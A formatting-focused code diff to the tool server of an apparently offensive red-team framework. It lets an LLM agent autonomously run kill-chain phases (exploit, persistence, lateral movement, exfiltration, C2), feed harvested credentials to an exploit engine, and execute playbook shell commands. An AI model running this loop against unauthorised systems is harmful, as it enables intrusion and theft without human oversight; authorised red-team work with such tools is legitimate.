@@ -8573,14 +8818,28 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     if cred_findings or hash_findings:
                         try:
                             from modules.autonomous_exploit_engine import AutonomousExploitEngine
+
                             _PLACEHOLDER_PATTERNS = (
-                                "CHANGE_ME", "CHANGEME", "YOUR_API_KEY_HERE",
-                                "admin", "root", "user", "password", "pass",
-                                "test", "guest", "anonymous",
+                                "CHANGE_ME",
+                                "CHANGEME",
+                                "YOUR_API_KEY_HERE",
+                                "admin",
+                                "root",
+                                "user",
+                                "password",
+                                "pass",
+                                "test",
+                                "guest",
+                                "anonymous",
                             )
+
                             def _is_placeholder(val: str) -> bool:
                                 lower = val.lower().strip()
-                                return any(p.lower() in lower for p in _PLACEHOLDER_PATTERNS if len(p) > 5) or lower in _PLACEHOLDER_PATTERNS
+                                return (
+                                    any(p.lower() in lower for p in _PLACEHOLDER_PATTERNS if len(p) > 5)
+                                    or lower in _PLACEHOLDER_PATTERNS
+                                )
+
                             engine = AutonomousExploitEngine.get_instance()
                             creds: list[dict[str, str]] = []
                             for cf in cred_findings:
@@ -8604,6 +8863,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     if _OBJECTIVES_AVAILABLE and obs.findings:
                         try:
                             from lazyown_objective import ObjectiveStore as _OS
+
                             _ostore = _OS()
                             _pending = _ostore.peek()
                             if _pending:
@@ -8623,13 +8883,12 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             _reactive_decision_note = ""
             try:
                 from reactive_engine import get_engine as _get_reactive
-                _re_engine  = _get_reactive()
+
+                _re_engine = _get_reactive()
                 _re_platform = "unknown"
                 if _wm is not None:
                     try:
-                        _re_platform = _wm.snapshot().get("hosts", {}).get(
-                            target, {}
-                        ).get("platform", "unknown")
+                        _re_platform = _wm.snapshot().get("hosts", {}).get(target, {}).get("platform", "unknown")
                     except Exception:
                         pass
                 _re_decisions = _re_engine.analyse(
@@ -8640,34 +8899,34 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 if _re_decisions:
                     top_d = _re_decisions[0]
                     _top_base = top_d.command.strip().split()[0]
-                    if (top_d.priority <= 2
-                            and not _reactive_state.get("cmd")
-                            and _top_base not in _blocked_cmds
-                            and _top_base != resolved_cmd):  # don't re-inject what just ran
-                        _reactive_state["cmd"]   = top_d.command
-                        _reactive_state["args"]  = ""
+                    if (
+                        top_d.priority <= 2
+                        and not _reactive_state.get("cmd")
+                        and _top_base not in _blocked_cmds
+                        and _top_base != resolved_cmd
+                    ):  # don't re-inject what just ran
+                        _reactive_state["cmd"] = top_d.command
+                        _reactive_state["args"] = ""
                         _reactive_state["reason"] = top_d.reason
                         _reactive_state["mitre"] = top_d.mitre_tactic
-                        _reactive_decision_note = (
-                            f"reactive:{top_d.action}:{top_d.command}"
-                        )
+                        _reactive_decision_note = f"reactive:{top_d.action}:{top_d.command}"
             except Exception:
                 pass
 
             # Record outcome in policy engine
-            step = _policy.on_command_complete(
-                target, resolved_cmd, resolved_args, output, None
-            )
+            step = _policy.on_command_complete(target, resolved_cmd, resolved_args, output, None)
 
             # Annotate parquet knowledge base with the real outcome (rich version)
             if _pdb is not None:
                 try:
                     import secrets as _secrets
+
                     _rid = _secrets.token_hex(8)
                     # Get campaign_id if available
                     _camp_id = ""
                     try:
                         from lazyown_campaign import CampaignStore as _CS
+
                         _camp = _CS().load()
                         if _camp:
                             _camp_id = _camp.campaign_id
@@ -8694,6 +8953,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 if _OBJECTIVES_AVAILABLE:
                     try:
                         from lazyown_objective import SoulUpdater as _SoulUpdater
+
                         _SoulUpdater().update_phase(step.category)
                     except Exception:
                         pass
@@ -8704,20 +8964,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 pwntomate_note = _run_pwntomate_if_xml_ready(target)
                 _refresh_facts(target)
 
-            should_stop = (
-                stop_on_high
-                and step.outcome == "success"
-                and step.category in high_value_cats
-            )
+            should_stop = stop_on_high and step.outcome == "success" and step.category in high_value_cats
             step_dict = {
-                "command":    full_command,
-                "category":   step.category,
-                "outcome":    step.outcome,
-                "reward":     step.reward,
+                "command": full_command,
+                "category": step.category,
+                "outcome": step.outcome,
+                "reward": step.reward,
                 "confidence": step.confidence,
-                "via":        via,
+                "via": via,
                 "policy_rec": top_rec["reason"],
-                "source":     top_rec["source"],
+                "source": top_rec["source"],
             }
             if _thought:
                 step_dict["thought"] = _thought
@@ -8735,15 +8991,24 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
         # Run the deterministic kill-chain bootstrap before the adaptive loop.
         if run_bootstrap:
-            _bootstrap_log = await asyncio.get_event_loop().run_in_executor(
-                None, _bootstrap_sequence
-            )
+            _bootstrap_log = await asyncio.get_event_loop().run_in_executor(None, _bootstrap_sequence)
 
         _loop_last_cmd: str = ""
         _loop_consecutive: int = 0
-        _loop_history: list[str] = []   # sliding window for oscillation detection
-        _PHASE_ORDER = ["recon", "enum", "exploit", "postexp", "persist", "privesc",
-                        "cred", "lateral", "exfil", "c2", "report"]
+        _loop_history: list[str] = []  # sliding window for oscillation detection
+        _PHASE_ORDER = [
+            "recon",
+            "enum",
+            "exploit",
+            "postexp",
+            "persist",
+            "privesc",
+            "cred",
+            "lateral",
+            "exfil",
+            "c2",
+            "report",
+        ]
 
         def _advance_phase_wm() -> None:
             if _wm is not None:
@@ -8778,7 +9043,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 _stuck_threshold = 2 if s["outcome"] != "success" else 3
                 if _loop_consecutive >= _stuck_threshold:
                     _blocked_cmds.add(_cmd_base)
-                    print(f"[auto_loop] AAAA stuck on '{_cmd_base}' ({s['outcome']}) — blocked + phase advance", flush=True)
+                    print(
+                        f"[auto_loop] AAAA stuck on '{_cmd_base}' ({s['outcome']}) — blocked + phase advance",
+                        flush=True,
+                    )
                     _advance_phase_wm()
                     _loop_consecutive = 0
                     _loop_last_cmd = ""
@@ -8787,15 +9055,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 # Detect last 6 commands forming 3 repeated pairs (A,B,A,B,A,B)
                 if len(_loop_history) >= 6:
                     h = _loop_history
-                    if (h[-6] == h[-4] == h[-2] and
-                            h[-5] == h[-3] == h[-1] and
-                            h[-6] != h[-5]):
+                    if h[-6] == h[-4] == h[-2] and h[-5] == h[-3] == h[-1] and h[-6] != h[-5]:
                         _osc_a, _osc_b = h[-6], h[-5]
                         if s["outcome"] != "success":
                             _blocked_cmds.add(_cmd_base)
                         else:
                             _blocked_cmds.add(_osc_a if _osc_a != _cmd_base else _osc_b)
-                        print(f"[auto_loop] ABABAB oscillation ('{_osc_a}'↔'{_osc_b}') — blocked + phase advance", flush=True)
+                        print(
+                            f"[auto_loop] ABABAB oscillation ('{_osc_a}'↔'{_osc_b}') — blocked + phase advance",
+                            flush=True,
+                        )
                         _advance_phase_wm()
                         _loop_history.clear()
                         _loop_last_cmd = ""
@@ -8817,11 +9086,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             for bs in _bootstrap_log:
                 bname = bs.get("bootstrap_step", "?")
                 if bname == "ping":
-                    lines.append(f"  ping → platform={bs.get('platform','?')} ({bs.get('outcome','?')})")
+                    lines.append(f"  ping → platform={bs.get('platform', '?')} ({bs.get('outcome', '?')})")
                 elif bname == "lazynmap":
-                    lines.append(f"  lazynmap → xml={bs.get('xml') or 'timeout'} ({bs.get('outcome','?')})")
+                    lines.append(f"  lazynmap → xml={bs.get('xml') or 'timeout'} ({bs.get('outcome', '?')})")
                 elif bname == "pwntomate":
-                    lines.append(f"  pwntomate → {bs.get('status','?')}")
+                    lines.append(f"  pwntomate → {bs.get('status', '?')}")
                 elif bname == "task_generation":
                     n = bs.get("tasks_created", 0)
                     titles = ", ".join(bs.get("titles", []))
@@ -8841,23 +9110,21 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         if execution_log:
             last = execution_log[-1]
             if last["outcome"] == "success" and last["category"] in high_value_cats:
-                lines.append(
-                    f"STOPPED: high-value success ({last['category']}) achieved."
-                )
+                lines.append(f"STOPPED: high-value success ({last['category']}) achieved.")
         return text("\n".join(lines))
 
     # ── llm_ask ───────────────────────────────────────────────────────────────
     elif name == "lazyown_llm_ask":
         if not _ensure_llm():
             return text("LLM bridge unavailable. Check skills/lazyown_llm.py.")
-        goal           = arguments["goal"]
-        context        = arguments.get("context", "")
-        backend        = arguments.get("backend", "groq")
+        goal = arguments["goal"]
+        context = arguments.get("context", "")
+        backend = arguments.get("backend", "groq")
         model_override = arguments.get("model", "") or None
-        max_iter       = int(arguments.get("max_iterations", 6))
-        sys_prompt     = arguments.get("system_prompt", "")
+        max_iter = int(arguments.get("max_iterations", 6))
+        sys_prompt = arguments.get("system_prompt", "")
 
-        cfg     = _load_payload()
+        cfg = _load_payload()
         api_key = cfg.get("api_key", "") or os.environ.get("GROQ_API_KEY", "")
 
         if backend == "groq" and not api_key:
@@ -8884,9 +9151,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     elif name == "lazyown_next_objective":
         if not _ensure_objectives():
             return text("Objective store unavailable.")
-        ctx = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _full_context_for_claude()
-        )
+        ctx = await asyncio.get_event_loop().run_in_executor(None, lambda: _full_context_for_claude())
         parts = []
         parts.append("=== SOUL ===")
         parts.append(ctx.get("soul", "(none)"))
@@ -8895,9 +9160,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         parts.append(f"\n=== OBJECTIVES ({ctx.get('pending_count', 0)} pending) ===")
         next_obj = ctx.get("next_objective")
         if next_obj:
-            parts.append(
-                f"NEXT [{next_obj['priority']}] [{next_obj['id']}]\n  {next_obj['text']}"
-            )
+            parts.append(f"NEXT [{next_obj['priority']}] [{next_obj['id']}]\n  {next_obj['text']}")
             if next_obj.get("notes"):
                 parts.append(f"  Notes: {next_obj['notes']}")
             if next_obj.get("context"):
@@ -8949,21 +9212,23 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from report_generator import ReportGenerator
-            rg   = ReportGenerator(sessions_dir=LAZYOWN_DIR / "sessions")
+
+            rg = ReportGenerator(sessions_dir=LAZYOWN_DIR / "sessions")
             path = rg.generate(output_path=output_path)
             return text(f"Report generated: {path}")
         except Exception as exc:
             return text(f"[report error] {exc}")
 
     elif name == "lazyown_cve_search":
-        product     = arguments.get("product", "").strip()
-        version     = arguments.get("version", "").strip()
+        product = arguments.get("product", "").strip()
+        version = arguments.get("version", "").strip()
         max_results = int(arguments.get("max_results", "10") or "10")
         if not product:
             return text("[cve_search error] 'product' is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from cve_matcher import CVEMatcher
+
             matcher = CVEMatcher()
             results = await asyncio.get_event_loop().run_in_executor(
                 None, lambda: matcher.search(product, version, max_results=max_results)
@@ -8982,23 +9247,22 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             return text(f"[cve_search error] {exc}")
 
     elif name == "lazyown_playbook_generate":
-        pb_target   = arguments.get("target", "").strip()
-        pb_phase    = arguments.get("phase", "").strip() or None
+        pb_target = arguments.get("target", "").strip()
+        pb_phase = arguments.get("phase", "").strip() or None
         pb_platform = arguments.get("platform", "linux").strip() or "linux"
-        pb_top_n    = int(arguments.get("top_n", "5") or "5")
+        pb_top_n = int(arguments.get("top_n", "5") or "5")
         if not pb_target:
             return text("[playbook_generate] 'target' is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from playbook_engine import PlaybookEngine
-            engine   = PlaybookEngine(top_n=pb_top_n)
+
+            engine = PlaybookEngine(top_n=pb_top_n)
             playbook = await asyncio.get_event_loop().run_in_executor(
                 None,
                 lambda: engine.derive(pb_target, phase=pb_phase, platform=pb_platform),
             )
-            saved_path = await asyncio.get_event_loop().run_in_executor(
-                None, lambda: engine.save(playbook)
-            )
+            saved_path = await asyncio.get_event_loop().run_in_executor(None, lambda: engine.save(playbook))
             lines = [
                 f"Playbook generated: {saved_path}",
                 f"Target: {playbook.target}  Phase: {playbook.phase}  "
@@ -9007,21 +9271,19 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             ]
             for i, step in enumerate(playbook.steps, 1):
                 atomic_id = step.atomic_id or "no atomic"
-                lines.append(
-                    f"  Step {i}: [{step.technique_id}] {step.name[:60]} "
-                    f"({atomic_id})"
-                )
+                lines.append(f"  Step {i}: [{step.technique_id}] {step.name[:60]} ({atomic_id})")
             return text("\n".join(lines))
         except Exception as exc:
             return text(f"[playbook_generate error] {exc}")
 
     elif name == "lazyown_playbook_run":
-        pb_path    = arguments.get("path", "").strip()
-        pb_target  = arguments.get("target", "").strip()
+        pb_path = arguments.get("path", "").strip()
+        pb_target = arguments.get("target", "").strip()
         pb_dry_run = bool(arguments.get("dry_run", False))
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from playbook_engine import PlaybookEngine
+
             engine = PlaybookEngine()
 
             # Resolve playbook path
@@ -9034,8 +9296,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                         pb_file = alt
             else:
                 sessions_pb = sorted(
-                    list((LAZYOWN_DIR / "sessions").glob("playbook_*.yaml"))
-                    + list(PLAYS_DIRECTORY.glob("apt_*.yaml")),
+                    list((LAZYOWN_DIR / "sessions").glob("playbook_*.yaml")) + list(PLAYS_DIRECTORY.glob("apt_*.yaml")),
                     key=lambda p: p.stat().st_mtime,
                     reverse=True,
                 )
@@ -9043,9 +9304,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     return text("[playbook_run] No playbook found. Run lazyown_playbook_generate first.")
                 pb_file = sessions_pb[0]
 
-            playbook = await asyncio.get_event_loop().run_in_executor(
-                None, lambda: engine.load(pb_file)
-            )
+            playbook = await asyncio.get_event_loop().run_in_executor(None, lambda: engine.load(pb_file))
 
             # Resolve target
             effective_target = pb_target or playbook.target
@@ -9057,6 +9316,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             # Signature: (command, target) matching PlaybookEngine.execute() contract
             def _mcp_executor(command: str, target: str = "") -> str:
                 import subprocess
+
                 cmd = substitute_playbook_target(command, target)
                 result = subprocess.run(
                     cmd,
@@ -9083,17 +9343,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── memory_recall ──────────────────────────────────────────────────────────
     elif name == "lazyown_memory_recall":
-        query  = arguments.get("query", "").strip()
-        host   = arguments.get("host", "").strip()
-        top_k  = int(arguments.get("top_k", "5") or "5")
+        query = arguments.get("query", "").strip()
+        host = arguments.get("host", "").strip()
+        top_k = int(arguments.get("top_k", "5") or "5")
         if not query and not host:
             return text("[memory_recall] 'query' or 'host' is required.")
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from memory_store import get_memory_store
+
             ms = get_memory_store()
-            entries = ms.recall_by_host(host, top_k=top_k) if (host and not query) \
-                      else ms.recall(query, top_k=top_k)
+            entries = ms.recall_by_host(host, top_k=top_k) if (host and not query) else ms.recall(query, top_k=top_k)
             if not entries:
                 return text("No matching memories found.")
             lines = [f"Memory recall: {len(entries)} results for '{query or host}'", ""]
@@ -9110,10 +9370,10 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             return text(f"[memory_recall error] {exc}")
 
     elif name == "lazyown_memory_store":
-        m_host    = arguments.get("host", "").strip()
-        m_tool    = arguments.get("tool", "").strip()
+        m_host = arguments.get("host", "").strip()
+        m_tool = arguments.get("tool", "").strip()
         m_command = arguments.get("command", "").strip()
-        m_output  = arguments.get("output", "").strip()
+        m_output = arguments.get("output", "").strip()
         m_success = bool(arguments.get("success", True))
         if not all([m_host, m_tool, m_command]):
             return text("[memory_store] host, tool, command are required.")
@@ -9122,12 +9382,16 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             import uuid as _uuid
 
             from memory_store import get_memory_store
+
             ms = get_memory_store()
             ms.remember(
                 session_id=_uuid.uuid4().hex[:8],
-                host=m_host, tool=m_tool,
-                command=m_command, output=m_output,
-                findings=[], success=m_success,
+                host=m_host,
+                tool=m_tool,
+                command=m_command,
+                output=m_output,
+                findings=[],
+                success=m_success,
             )
             stats = ms.stats()
             return text(f"Stored. Memory total: {stats.get('total', '?')} entries.")
@@ -9136,11 +9400,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── searchsploit ───────────────────────────────────────────────────────────
     elif name == "lazyown_searchsploit":
-        sp_query   = arguments.get("query", "").strip()
-        sp_cve     = arguments.get("cve", "").strip()
+        sp_query = arguments.get("query", "").strip()
+        sp_cve = arguments.get("cve", "").strip()
         sp_service = arguments.get("service", "").strip()
         sp_version = arguments.get("version", "").strip()
-        sp_msf     = bool(arguments.get("include_msf", False))
+        sp_msf = bool(arguments.get("include_msf", False))
 
         # Build search term: query > cve > service+version
         if sp_query:
@@ -9161,9 +9425,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         # creds_py, and prints sploitus + shodan reference URLs.
         # include_msf is handled natively by do_ss (always calls msfconsole).
         ss_cmd = f"ss {search_term}"
-        raw = await asyncio.get_event_loop().run_in_executor(
-            None, lambda: _run_lazyown_command(ss_cmd, timeout=120)
-        )
+        raw = await asyncio.get_event_loop().run_in_executor(None, lambda: _run_lazyown_command(ss_cmd, timeout=120))
         if not raw or not raw.strip():
             return text(f"[ss] No output for query '{search_term}'. Check that searchsploit is installed.")
         return text(raw[:8000])
@@ -9175,15 +9437,13 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from integrations.misp_export import get_exporter as _misp_get
+
             exporter = _misp_get()
             event = await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: exporter.export_session(LAZYOWN_DIR / "sessions", target=misp_target)
+                None, lambda: exporter.export_session(LAZYOWN_DIR / "sessions", target=misp_target)
             )
             out_path = misp_output or str(LAZYOWN_DIR / "sessions" / "misp_event.json")
-            saved = await asyncio.get_event_loop().run_in_executor(
-                None, lambda: exporter.save(event, out_path)
-            )
+            saved = await asyncio.get_event_loop().run_in_executor(None, lambda: exporter.save(event, out_path))
             return text(
                 f"MISP event saved: {saved}\n"
                 f"Attributes: {len(event.attributes)}  "
@@ -9195,13 +9455,14 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── eval_quality ───────────────────────────────────────────────────────────
     elif name == "lazyown_eval_quality":
-        eq_session  = arguments.get("session_id", "").strip() or None
-        eq_export   = bool(arguments.get("export_dataset", False))
+        eq_session = arguments.get("session_id", "").strip() or None
+        eq_export = bool(arguments.get("export_dataset", False))
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from llm_evaluator import get_evaluator
-            ev      = get_evaluator()
-            report  = ev.quality_report(session_id=eq_session)
+
+            ev = get_evaluator()
+            report = ev.quality_report(session_id=eq_session)
             if eq_export:
                 out_path = LAZYOWN_DIR / "sessions" / "finetuning_dataset.jsonl"
                 exported = await asyncio.get_event_loop().run_in_executor(
@@ -9214,8 +9475,8 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── collab_publish ─────────────────────────────────────────────────────────
     elif name == "lazyown_collab_publish":
-        cp_type     = arguments.get("type", "generic").strip()
-        cp_payload  = arguments.get("payload", "{}").strip()
+        cp_type = arguments.get("type", "generic").strip()
+        cp_payload = arguments.get("payload", "{}").strip()
         cp_operator = arguments.get("operator", "agent").strip()
         try:
             payload_dict = json.loads(cp_payload) if cp_payload else {}
@@ -9224,6 +9485,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from collab_bp import publish_event
+
             publish_event(type=cp_type, payload=payload_dict, operator=cp_operator)
             return text(f"Event '{cp_type}' published to {cp_operator} channel.")
         except Exception as exc:
@@ -9232,33 +9494,36 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
     # ── c2_profile ─────────────────────────────────────────────────────────────
     elif name == "lazyown_c2_profile":
         cp_action = arguments.get("action", "list").strip()
-        cp_name   = arguments.get("name", "").strip()
+        cp_name = arguments.get("name", "").strip()
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
             from c2_profile import get_registry
+
             registry = get_registry()
             if cp_action == "list":
                 names = registry.list_names()
                 lines = ["Available C2 profiles:", ""]
                 for n in names:
                     p = registry.get(n)
-                    lines.append(f"  {n:12s}  sleep={p.sleep.interval_ms}ms  "
-                                 f"jitter={p.sleep.jitter_pct}%  "
-                                 f"ua={p.http_get.user_agent[:40]}")
+                    lines.append(
+                        f"  {n:12s}  sleep={p.sleep.interval_ms}ms  "
+                        f"jitter={p.sleep.jitter_pct}%  "
+                        f"ua={p.http_get.user_agent[:40]}"
+                    )
                 return text("\n".join(lines))
             elif cp_action in ("show", "set"):
                 if not cp_name:
                     return text(f"[c2_profile] 'name' is required for action='{cp_action}'.")
                 profile = registry.get(cp_name)
                 if profile is None:
-                    return text(f"[c2_profile] Unknown profile '{cp_name}'. "
-                                f"Available: {registry.list_names()}")
+                    return text(f"[c2_profile] Unknown profile '{cp_name}'. Available: {registry.list_names()}")
                 if cp_action == "set":
                     cfg = _load_payload()
                     cfg["c2_profile"] = cp_name
                     try:
                         payload_path = LAZYOWN_DIR / "payload.json"
                         import json as _json
+
                         payload_path.write_text(_json.dumps(cfg, indent=2))
                     except Exception:
                         pass
@@ -9281,15 +9546,15 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── bridge_suggest ──────────────────────────────────────────────────────────
     elif name == "lazyown_bridge_suggest":
-        bs_phase       = arguments.get("phase", "recon").strip() or "recon"
-        bs_target      = arguments.get("target", "").strip()
-        bs_services    = arguments.get("services", [])
-        bs_excluded    = set(arguments.get("excluded", []))
-        bs_mitre       = arguments.get("mitre_hint", "").strip()
-        bs_tag         = arguments.get("tag_hint", "").strip()
-        bs_os          = arguments.get("os_hint", "any").strip() or "any"
-        bs_list_all    = bool(arguments.get("list_all", False))
-        bs_sequence    = bool(arguments.get("sequence", False))
+        bs_phase = arguments.get("phase", "recon").strip() or "recon"
+        bs_target = arguments.get("target", "").strip()
+        bs_services = arguments.get("services", [])
+        bs_excluded = set(arguments.get("excluded", []))
+        bs_mitre = arguments.get("mitre_hint", "").strip()
+        bs_tag = arguments.get("tag_hint", "").strip()
+        bs_os = arguments.get("os_hint", "any").strip() or "any"
+        bs_list_all = bool(arguments.get("list_all", False))
+        bs_sequence = bool(arguments.get("sequence", False))
         bs_cat_summary = bool(arguments.get("catalog_summary", False))
         try:
             sys.path.insert(0, str(LAZYOWN_DIR / "modules"))
@@ -9306,8 +9571,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                     "",
                 ]
                 for phase, cmds in summary.items():
-                    lines.append(f"  {phase:12s} ({len(cmds):3d}): {', '.join(cmds[:8])}"
-                                 + (" ..." if len(cmds) > 8 else ""))
+                    lines.append(
+                        f"  {phase:12s} ({len(cmds):3d}): {', '.join(cmds[:8])}" + (" ..." if len(cmds) > 8 else "")
+                    )
                 return text("\n".join(lines))
 
             # ── list_all mode ─────────────────────────────────────────────
@@ -9322,12 +9588,11 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 ]
                 for e in entries:
                     cred_tag = " [creds]" if e.requires_creds else ""
-                    svc_tag  = f" [{','.join(e.services[:3])}]" if e.services else ""
-                    os_tag   = f" [{e.os_target}]" if e.os_target != "any" else ""
-                    tag_str  = f" #{','.join(e.tags[:2])}" if e.tags else ""
+                    svc_tag = f" [{','.join(e.services[:3])}]" if e.services else ""
+                    os_tag = f" [{e.os_target}]" if e.os_target != "any" else ""
+                    tag_str = f" #{','.join(e.tags[:2])}" if e.tags else ""
                     lines.append(
-                        f"  {e.priority}. {e.command:30s}{cred_tag}{svc_tag}{os_tag}{tag_str}"
-                        f"  {e.mitre_tactic}"
+                        f"  {e.priority}. {e.command:30s}{cred_tag}{svc_tag}{os_tag}{tag_str}  {e.mitre_tactic}"
                     )
                     lines.append(f"       {e.description}")
                 return text("\n".join(lines))
@@ -9336,6 +9601,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             _wm_snapshot = None
             try:
                 from world_model import WorldModel
+
                 _wm_snapshot = WorldModel().snapshot()
                 if not bs_target and _wm_snapshot:
                     _hosts = list(_wm_snapshot.get("hosts", {}).keys())
@@ -9386,7 +9652,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 )
             cmd_str, entry = result
             tag_str = f" #{', #'.join(entry.tags)}" if entry.tags else ""
-            os_str  = f" [{entry.os_target}]" if entry.os_target != "any" else ""
+            os_str = f" [{entry.os_target}]" if entry.os_target != "any" else ""
             lines = [
                 f"Suggested: {cmd_str}",
                 f"  Phase:       {entry.phase}",
@@ -9406,18 +9672,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
 
     # ── atomic_search ────────────────────────────────────────────────────────
     elif name == "lazyown_atomic_search":
-        as_keyword      = arguments.get("keyword", "").strip()
-        as_mitre        = arguments.get("mitre_id", "").strip()
-        as_platform     = arguments.get("platform", "").strip()
-        as_scope        = arguments.get("scope", "").strip()
-        as_complexity   = arguments.get("complexity", "").strip()
-        as_has_prereqs  = arguments.get("has_prereqs")   # None | True | False
-        as_limit        = int(arguments.get("limit", 10))
-        as_incl_cmd     = bool(arguments.get("include_command", False))
+        as_keyword = arguments.get("keyword", "").strip()
+        as_mitre = arguments.get("mitre_id", "").strip()
+        as_platform = arguments.get("platform", "").strip()
+        as_scope = arguments.get("scope", "").strip()
+        as_complexity = arguments.get("complexity", "").strip()
+        as_has_prereqs = arguments.get("has_prereqs")  # None | True | False
+        as_limit = int(arguments.get("limit", 10))
+        as_incl_cmd = bool(arguments.get("include_command", False))
         if as_has_prereqs is not None:
             as_has_prereqs = bool(as_has_prereqs)
-        if not any([as_keyword, as_mitre, as_platform, as_scope, as_complexity,
-                    as_has_prereqs is not None]):
+        if not any([as_keyword, as_mitre, as_platform, as_scope, as_complexity, as_has_prereqs is not None]):
             return text(
                 "[atomic_search] Provide at least one filter: keyword, mitre_id, "
                 "platform, scope, complexity, or has_prereqs."
@@ -9426,6 +9691,7 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
             sys.path.insert(0, str(MODULES_DIR))
             from atomic_enricher import enrich as _enrich_atomic
             from atomic_enricher import query_atomic as _qa
+
             # Build enriched parquet on first use
             _enrich_atomic()
             rows = _qa(
@@ -9446,14 +9712,9 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
                 )
             lines = [f"Atomic Red Team search: {len(rows)} results\n"]
             for r in rows:
-                plat_str  = ", ".join(r["platform_list"]) or "any"
-                lines.append(
-                    f"{r['mitre_id']:12s}  [{r['complexity']:6s}] [{r['scope']:8s}]  "
-                    f"{r['name']}"
-                )
-                lines.append(
-                    f"  platforms: {plat_str}   prereqs: {r['has_prereqs']}"
-                )
+                plat_str = ", ".join(r["platform_list"]) or "any"
+                lines.append(f"{r['mitre_id']:12s}  [{r['complexity']:6s}] [{r['scope']:8s}]  {r['name']}")
+                lines.append(f"  platforms: {plat_str}   prereqs: {r['has_prereqs']}")
                 lines.append(f"  tags: {', '.join(r['keyword_tags'][:6])}")
                 if as_incl_cmd and r.get("command_preview"):
                     lines.append(f"  command: {r['command_preview'][:120]}")
@@ -9468,32 +9729,28 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
         try:
             sys.path.insert(0, str(MODULES_DIR))
             from session_rag import get_rag as _get_rag
+
             _rag = _get_rag()
             if rag_mode == "full":
-                result_counts = await asyncio.get_event_loop().run_in_executor(
-                    None, _rag.index_all
-                )
+                result_counts = await asyncio.get_event_loop().run_in_executor(None, _rag.index_all)
             else:
-                result_counts = await asyncio.get_event_loop().run_in_executor(
-                    None, _rag.index_new
-                )
+                result_counts = await asyncio.get_event_loop().run_in_executor(None, _rag.index_new)
             # Also index knowledge-base parquets (techniques, binarios, lolbas)
             pq_counts = await asyncio.get_event_loop().run_in_executor(
                 None, lambda: _rag.index_parquet_sources(force=(rag_mode == "full"))
             )
             stats = _rag.stats()
             lines = [
-                f"RAG index ({rag_mode}): {result_counts['files']} session files, "
-                f"{result_counts['chunks']} new chunks",
-                f"  + parquets:     {pq_counts['files']} KB files, "
-                f"{pq_counts['chunks']} new chunks",
+                f"RAG index ({rag_mode}): {result_counts['files']} session files, {result_counts['chunks']} new chunks",
+                f"  + parquets:     {pq_counts['files']} KB files, {pq_counts['chunks']} new chunks",
                 f"Backend:        {stats['backend']}",
                 f"Indexed files:  {stats['indexed_files']}",
                 f"Total chunks:   {stats['total_chunks']}",
             ]
             if not stats["chroma_ok"]:
-                lines.append("Note: chromadb not installed — using keyword fallback. "
-                             "For semantic search: pip install chromadb")
+                lines.append(
+                    "Note: chromadb not installed — using keyword fallback. For semantic search: pip install chromadb"
+                )
             return text("\n".join(lines))
         except Exception as exc:
             return text(f"[rag_index error] {exc}")
@@ -9501,18 +9758,17 @@ async def call_tool(name: str, arguments: dict[str, Any]) -> list[types.TextCont
